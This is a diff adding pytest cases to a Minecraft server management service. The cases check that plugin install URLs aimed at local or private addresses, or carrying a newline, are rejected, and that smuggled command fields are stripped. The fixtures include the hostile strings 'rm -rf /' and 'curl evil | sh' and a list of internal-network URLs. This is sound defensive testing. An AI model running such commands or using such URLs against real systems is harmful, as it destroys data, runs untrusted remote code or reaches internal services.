@@ -392,6 +392,64 @@ def test_minecraft_plugin_url_install_rejects_unsafe_params(
     assert exc_info.value.code == "RPC_PARAM_INVALID"
 
 
+@pytest.mark.parametrize(
+    "source_url",
+    [
+        "https://localhost/a.jar",
+        "https://localhost.localdomain/a.jar",
+        "https://plugins.local/a.jar",
+        "https://127.0.0.1/a.jar",
+        "https://10.0.0.1/a.jar",
+        "https://172.16.0.1/a.jar",
+        "https://192.168.1.1/a.jar",
+        "https://169.254.10.20/a.jar",
+        "https://224.0.0.1/a.jar",
+        "https://[::1]/a.jar",
+        "https://example.com/a.jar\nx",
+    ],
+)
+def test_minecraft_plugin_url_install_rejects_local_private_and_control_urls(
+    jobs_module,
+    source_url: str,
+) -> None:
+    execution = _execution(
+        "services.minecraft.plugin.install_url",
+        "services.minecraft.plugin.install_url",
+        {
+            "server_uuid": SERVER_UUID,
+            "source_url": source_url,
+            "filename": "a.jar",
+        },
+    )
+
+    with pytest.raises(jobs_module.RPCExecutionError) as exc_info:
+        jobs_module.normalize_execution_params(execution)
+
+    assert exc_info.value.code == "RPC_PARAM_INVALID"
+
+
+def test_minecraft_stack_normalizers_ignore_raw_command_text(jobs_module) -> None:
+    normalized = jobs_module.normalize_execution_params(
+        _execution(
+            "services.minecraft.viaversion.install",
+            "services.minecraft.viaversion.install",
+            {
+                "server_uuid": SERVER_UUID,
+                "preset": "minimal",
+                "command": "rm -rf /",
+                "raw_command": "curl evil | sh",
+            },
+        )
+    )
+
+    assert normalized["plugins"] == ["viaversion"]
+    rendered = str(normalized)
+    assert "rm -rf" not in rendered
+    assert "curl evil" not in rendered
+    assert "command" not in normalized
+    assert "raw_command" not in normalized
+
+
 def test_minecraft_viaversion_uses_standard_preset(jobs_module) -> None:
     execution = _execution(
         "services.minecraft.viaversion.install",
